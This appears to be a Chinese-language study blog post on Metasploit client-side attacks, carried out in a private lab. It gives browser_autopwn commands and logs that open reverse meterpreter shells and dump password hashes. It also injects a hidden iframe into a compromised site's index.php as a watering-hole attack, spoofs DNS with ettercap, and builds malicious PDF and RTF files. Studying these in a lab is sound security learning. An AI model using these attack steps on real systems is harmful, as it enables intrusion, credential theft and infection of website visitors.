---
title: MasterMsf 7 客户端渗透
category: metasploit
---

# {{ page.title }}

## 启程

> I am good at reading people. My secret, I look for worst in them.

本章将研究实践对浏览器等客户端的攻击。

## 浏览器渗透

### Browser Autopwn

这是Metasploit中的一个模块，它对各种浏览器进行自动化攻击。其工作流程是：加载所有浏览器渗透模块并处于监听状态，同时开启不同平台的反向shell监听。接着等待浏览器连接，然后根据浏览器版本信息发送对应的攻击向量，图示如下：

![Bildschirmfoto 2018-10-30 um 12.59.35 PM.png]({{ site.url }}/images/metasploit/245B4C0C07EB25327FDF08ED25211FF4.png)

下面我们对Win2K上的IE 6进行测试。仔细观察模块的加载和启动过程：

```bash
msf > use auxiliary/server/browser_autopwn
msf auxiliary(server/browser_autopwn) > set LHOST 172.16.56.1
LHOST => 172.16.56.1
msf auxiliary(server/browser_autopwn) > set SRVPORT 8080
SRVPORT => 8080
# / 表示根目录，即各种渗透模块都使用
msf auxiliary(server/browser_autopwn) > set URIPATH /
URIPATH => /

msf auxiliary(server/browser_autopwn) > run
[*] Auxiliary module running as background job 0.

[*] Setup
msf auxiliary(server/browser_autopwn) >
[*] Starting exploit modules on host 172.16.56.1...
[*] ---

# 启动各种攻击向量
[*] Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/lHmin
[*] Local IP: http://192.168.1.101:8080/lHmin
[*] Server started.
[*] Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/kINjsZQVDtv
[*] Local IP: http://192.168.1.101:8080/kINjsZQVDtv
[*] Server started.
[*] Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/wNShgBZlWcq
[*] Local IP: http://192.168.1.101:8080/wNShgBZlWcq
[*] Server started.
[*] Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/HorQWCGJmHlI
[*] Local IP: http://192.168.1.101:8080/HorQWCGJmHlI
[*] Server started.
# ... 省去了很多内容，后面会用jobs以列表展示

# 开启监听反向shell
[*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
[*] Starting handler for generic/shell_reverse_tcp on port 6666
[*] Started reverse TCP handler on 172.16.56.1:3333
[*] Starting handler for java/meterpreter/reverse_tcp on port 7777
[*] Started reverse TCP handler on 172.16.56.1:6666
[*] Started reverse TCP handler on 172.16.56.1:7777

[*] --- Done, found 20 exploit modules

[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://192.168.1.101:8080/
[*] Server started.
```

至此，`browser_autopwn`启动完毕。我们可以用jobs看一下后台任务：

```
msf auxiliary(server/browser_autopwn) > jobs

Jobs
====

  Id  Name                                                       Payload                          Payload opts
  --  ----                                                       -------                          ------------
  0   Auxiliary: server/browser_autopwn
  1   Exploit: android/browser/webview_addjavascriptinterface    android/meterpreter/reverse_tcp  tcp://172.16.56.1:8888
  2   Exploit: multi/browser/firefox_proto_crmfrequest           generic/shell_reverse_tcp        tcp://172.16.56.1:6666
  3   Exploit: multi/browser/firefox_tostring_console_injection  generic/shell_reverse_tcp        tcp://172.16.56.1:6666
  4   Exploit: multi/browser/firefox_webidl_injection            generic/shell_reverse_tcp        tcp://172.16.56.1:6666
  5   Exploit: multi/browser/java_atomicreferencearray           java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
  6   Exploit: multi/browser/java_jre17_jmxbean                  java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
  7   Exploit: multi/browser/java_jre17_provider_skeleton        java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
  8   Exploit: multi/browser/java_jre17_reflection_types         java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
  9   Exploit: multi/browser/java_rhino                          java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
  10  Exploit: multi/browser/java_verifier_field_access          java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
  11  Exploit: multi/browser/opera_configoverwrite               generic/shell_reverse_tcp        tcp://172.16.56.1:6666
  12  Exploit: windows/browser/adobe_flash_mp4_cprt              windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  13  Exploit: windows/browser/adobe_flash_rtmp                  windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  14  Exploit: windows/browser/ie_cgenericelement_uaf            windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  15  Exploit: windows/browser/ie_createobject                   windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  16  Exploit: windows/browser/ie_execcommand_uaf                windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  17  Exploit: windows/browser/mozilla_nstreerange               windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  18  Exploit: windows/browser/ms13_080_cdisplaypointer          windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  19  Exploit: windows/browser/ms13_090_cardspacesigninhelper    windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  20  Exploit: windows/browser/msxml_get_definition_code_exec    windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  21  Exploit: multi/handler                                     windows/meterpreter/reverse_tcp  tcp://172.16.56.1:3333
  22  Exploit: multi/handler                                     generic/shell_reverse_tcp        tcp://172.16.56.1:6666
  23  Exploit: multi/handler                                     java/meterpreter/reverse_tcp     tcp://172.16.56.1:7777
```

感觉还是蛮壮观的。下面我们用IE 6去访问`http://172.16.56.1:8080`：

```bash
[*] Handling '/'
[*] Handling '/?sessid=V2luZG93cyBYUDp1bmRlZmluZWQ6dW5kZWZpbmVkOnVuZGVmaW5lZDpTUDA6emgtY246eDg2Ok1TSUU6Ni4wOg%3d%3d'
[*] JavaScript Report: Windows XP:undefined:undefined:undefined:SP0:zh-cn:x86:MSIE:6.0:
[*] Reporting: {"os.product"=>"Windows XP", "os.version"=>"SP0", "os.language"=>"zh-cn", "os.arch"=>"x86", "os.certainty"=>"0.7"}
[*] Responding with 14 exploits
# ...
[*] 172.16.56.152    ie_createobject - Sending exploit HTML...
[*] 172.16.56.152    java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
# ...
[*] 172.16.56.152    java_verifier_field_access - Generated jar to drop (5308 bytes).
[*] 172.16.56.152    ie_createobject - Sending EXE payload
[*] Sending stage (179779 bytes) to 172.16.56.152
[*] Meterpreter session 1 opened (172.16.56.1:3333 -> 172.16.56.152:1124) at 2018-10-30 12:48:34 +0800
# ...
[*] Meterpreter session 2 opened (172.16.56.1:3333 -> 172.16.56.152:1126) at 2018-10-30 12:48:34 +0800
[*] Session ID 1 (172.16.56.1:3333 -> 172.16.56.152:1124) processing InitialAutoRunScript 'migrate -f'
[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
[!] Example: run post/windows/manage/migrate OPTION=value [...]
[*] Session ID 2 (172.16.56.1:3333 -> 172.16.56.152:1126) processing InitialAutoRunScript 'migrate -f'
[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
[!] Example: run post/windows/manage/migrate OPTION=value [...]
[*] Current server process: iuxWclhTGmmDzKjeaH.exe (540)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 956
[*] Current server process: GAasDKFKpT.exe (1488)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 1600
[+] Successfully migrated to process
[+] Successfully migrated to process
```

我们已经获得了两个会话：

```bash
msf auxiliary(server/browser_autopwn) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  XXX-91962AAC0C1\xxx @ XXX-91962AAC0C1  172.16.56.1:3333 -> 172.16.56.152:1124 (172.16.56.152)
  2         meterpreter x86/windows  XXX-91962AAC0C1\xxx @ XXX-91962AAC0C1  172.16.56.1:3333 -> 172.16.56.152:1126 (172.16.56.152)

# first
msf auxiliary(server/browser_autopwn) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: XXX-91962AAC0C1\xxx
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# second
msf auxiliary(server/browser_autopwn) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: XXX-91962AAC0C1\xxx
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > run hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 959fbd30b1cc734cc231a901c250a078...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:xxxxx:xxxxx:::
Guest:501:xxxxx:xxxxx:::
xxx:1000:xxxxx:xxxxx:::
```

这个有点酷炫啊，有点像电影里演的那样。

### 水坑攻击

本节实验是上一节的延伸，攻击者先攻陷一个服务器，然后在服务器的网页中注入指向属于攻击者的`Browser AUtopwn`服务器的恶意`iFrame`。当别的客户机访问被感染服务器后，他的浏览器将被渗透。这就是我们我们说的“水坑攻击”。其流程如下：

![Bildschirmfoto 2018-10-30 um 12.59.49 PM.png]({{ site.url }}/images/metasploit/7D19EC7B345A866F85DBE81AEAE8D583.png)

我们建立实验环境如下：

```
Browser Autopwn Server: 172.16.56.1
URL: http://172.16.56.1:8080

Vulnerable Server: 172.16.56.130 (Metasploitable2)
URL: http://172.16.56.130

Guest of Metasploitable2: 172.16.56.152
```

在一切开始前，Guest访问Metasploitable2情况如下：

![Bildschirmfoto 2018-10-30 um 1.12.12 PM.png]({{ site.url }}/images/metasploit/E0D1BCB10DD6F113318E76154DC85861.png)

确保browser_autopwn处于启动状态，然后攻陷服务器（第一章的过程）。之后修改其网站上的`index.php`文件。先下载下来：

```
meterpreter > cd /var/www/
meterpreter > download ./index.php
[*] Downloading: ./index.php -> index.php
[*] Downloaded 891.00 B of 891.00 B (100.0%): ./index.php -> index.php
[*] download   : ./index.php -> index.php
```

然后添加恶意iframe：

```html
<iframe src="http://172.16.56.1:8080/" width=0 height=0 styple="hidden"
frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>
```

再上传上去：

```bash
meterpreter > mv ./index.php ./index.php.bak
meterpreter > upload index.php ./
[*] uploading  : index.php -> ./
[*] uploaded   : index.php -> .//index.php

#别忘记改权限，否则浏览器无法访问
meterpreter > chmod 644 index.php
```

之后，Guest去访问服务器网站，依然是原样：

![Bildschirmfoto 2018-10-30 um 1.44.01 PM.png]({{ site.url }}/images/metasploit/8F881272DD2E68526E06D1763A25F0D4.png)

但是如果他查看源文件，就会发现不对劲：

![Bildschirmfoto 2018-10-30 um 1.44.33 PM.png]({{ site.url }}/images/metasploit/50741939A1791641B01A07B309584334.png)

而此时，攻击者已经获得他的shell了：

![Bildschirmfoto 2018-10-30 um 1.45.25 PM.png]({{ site.url }}/images/metasploit/E5A5B8C7279CF9DDB3A6B5A509AFAF61.png)

（是最后两个。前两个是攻陷服务器时得到的。）

### 与DNS劫持一起享用

本节实验如下：

- 范围：局域网内
- 内容：对目标实施ARP攻击及DNS劫持，从而将其经常访问的URL重定向为我们的browser_autopwn服务器，然后由browser_autopwn渗透
- 攻击者：Kali 172.16.56.200
- Browser Autopwn服务器：172.16.56.1
- 靶机：Win2K 172.16.56.152

首先在配置文件中添加要劫持的URL：

```bash
# add entry in /etc/ettercap/etter.dns
www.4399.com      A   172.16.56.1
```

然后启动ettercap：

```
ettercap -G
```

选择监听网卡：

![Bildschirmfoto 2018-10-30 um 2.05.12 PM.png]({{ site.url }}/images/metasploit/D9D3FC810D7478C5BCB9B4EB1DA3A131.png)

![Bildschirmfoto 2018-10-30 um 2.05.22 PM.png]({{ site.url }}/images/metasploit/FD88A4435D0380C9CD098098CCB60B18.png)

然后在Hosts中选择扫描：

![Bildschirmfoto 2018-10-30 um 2.15.22 PM.png]({{ site.url }}/images/metasploit/CF03920B5D58649803A956A6BE5A0447.png)

在Hosts中选择主机列表：

![Bildschirmfoto 2018-10-30 um 2.18.15 PM.png]({{ site.url }}/images/metasploit/CC32B12403B4298DF646CB4B8A8F33CD.png)

我们将靶机`.152`添加到目标1，将网关`172.16.56.2`添加到目标2：

![Bildschirmfoto 2018-10-30 um 2.19.37 PM.png]({{ site.url }}/images/metasploit/819919CA8B0576EFCD19E4F07631FFA1.png)

然后选择中间人攻击的ARP投毒：

![Bildschirmfoto 2018-10-30 um 2.20.10 PM.png]({{ site.url }}/images/metasploit/DDCC2BFFC31C41DC9E0341913A077485.png)

勾选嗅探远程连接选项。然后选择开始嗅探。接着点击插件、插件管理，双击激活dns_spoof：

![Bildschirmfoto 2018-10-30 um 2.22.26 PM.png]({{ site.url }}/images/metasploit/50E91D0618B7BED534DF1EAE98CBAF50.png)

确保browser_autopwn服务器已经上线，万事俱备。受害者尝试打开`http://www.4399.com`：

![Bildschirmfoto 2018-10-30 um 2.55.38 PM.png]({{ site.url }}/images/metasploit/AF070315FFC820D9049AC4069A5B752E.png)

观察ettercap的日志如下：

![Bildschirmfoto 2018-10-30 um 2.57.16 PM.png]({{ site.url }}/images/metasploit/DF01150EA224019B59782372916B458D.png)

browser_autopwn服务器这边已经能够已经getshell了：

![Bildschirmfoto 2018-10-30 um 2.58.15 PM.png]({{ site.url }}/images/metasploit/380E171A8DCFAA1322603DF063600CA9.png)

## 基于各种文件格式渗透

最近美国披露的朝鲜黑客，其使用的“鱼叉攻击”就是借助E-mail发送恶意文件，从而感染索尼员工的电脑。我们来来看看这种攻击方式。

### PDF

漏洞是CVE-2010-2883，具体的分析工作在读完《0day安全》后跟随《漏洞战争》的学习进行，本次仅仅做漏洞复现实验。

```
OS: Windows 7 32-bit
Adobe Reader: 9.3
```

首先生成一个恶意pdf：

```
msf > use windows/fileformat/adobe_cooltype_sing
msf exploit(windows/fileformat/adobe_cooltype_sing) > show options

Module options (exploit/windows/fileformat/adobe_cooltype_sing):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.pdf          yes       The file name.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.56.1      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

注意我们用了反向shell，这是因为在现实中我们不知道受害者什么时候会打开pdf。

然后设置监听，当目标打开文件后我们将获得shell：

```
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 172.16.56.1:4444
[*] Sending stage (179779 bytes) to 172.16.56.159
[*] Meterpreter session 1 opened (172.16.56.1:4444 -> 172.16.56.159:49169) at 2018-10-30 15:30:24 +0800

meterpreter > getuid
Server username: WIN-J7CB6NT7B29\rambo

meterpreter > sysinfo
Computer        : WIN-J7CB6NT7B29
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 4
Meterpreter     : x86/windows
```

不过，对方的Adobe可能会卡死。这时候目标很可能会强制结束，所以在成功获得shell后最好赶快migrate：

![Bildschirmfoto 2018-10-30 um 3.30.55 PM.png]({{ site.url }}/images/metasploit/E4211A96885FD6B7F2D9F0E6CCBE32D5.png)

### Word

漏洞是MS10_087。同样地，我们这里先不去分析其原理。

```
OS: Windows 7 32-bit
Office: Standard 2007
```

利用过程与上面的十分类似，都是生成恶意文件：

```
msf > use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > show options

Module options (exploit/windows/fileformat/ms10_087_rtf_pfragments_bof):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.rtf          yes       The file name.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.56.1      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

同样开启监听：

```
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 172.16.56.1:4444
[*] Sending stage (179779 bytes) to 172.16.56.159
[*] Meterpreter session 2 opened (172.16.56.1:4444 -> 172.16.56.159:49180) at 2018-10-30 15:43:49 +0800

meterpreter > getuid
Server username: WIN-J7CB6NT7B29\rambo
```

同样卡死(hahahaha)：

![Bildschirmfoto 2018-10-30 um 3.43.57 PM.png]({{ site.url }}/images/metasploit/9D5179A37371C852C580F897B60130D2.png)

## 总结

这一章让人很开眼界——攻击方式真的是多种多样。

就这样，又结束了一章。大学的最后一年，日子如流水般一天天过去。那么，就这样坚持和努力吧。

There are always some people and ideals, for whom and which we strive, endure and persist when isolated. That's why we struggle to our feet and refuse to give up.

Also, der Traum ist ein Stern im Himmel. Das weiß ich schon. Ich will mich bemühen, ihn zu erfüllen.

Viel Glück!